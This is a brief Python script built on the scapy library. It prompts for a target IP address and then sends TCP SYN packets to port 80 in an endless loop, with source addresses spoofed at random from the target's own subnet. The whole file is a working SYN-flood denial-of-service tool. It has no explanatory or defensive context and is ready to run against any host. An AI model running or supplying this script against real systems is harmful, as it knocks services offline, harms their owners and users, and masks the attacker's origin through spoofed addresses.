from scapy.all import *
from random import getrandbits

target_ip = input("Enter target IP: ")
target_port = 80

ip = IP(src=RandIP(f'{target_ip}/24'), dst = target_ip)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S", seq=100)
raw = Raw(b'Random data')
syn_pack = ip/tcp/raw
while True:
    send(syn_pack)